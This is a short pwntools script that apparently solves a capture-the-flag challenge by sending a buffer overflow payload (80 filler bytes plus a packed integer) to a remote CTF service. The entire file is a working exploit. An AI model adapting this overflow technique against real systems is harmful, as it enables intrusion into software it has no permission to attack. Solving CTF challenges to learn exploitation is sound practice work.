from pwn import *

r = remote('challenge.acictf.com', 13996)

print(r.recv())
#print(r.recv())

payload = "A"*80 + p32(1211332983)
print(payload)
r.send(payload)
print(r.recv())
print(r.recv())
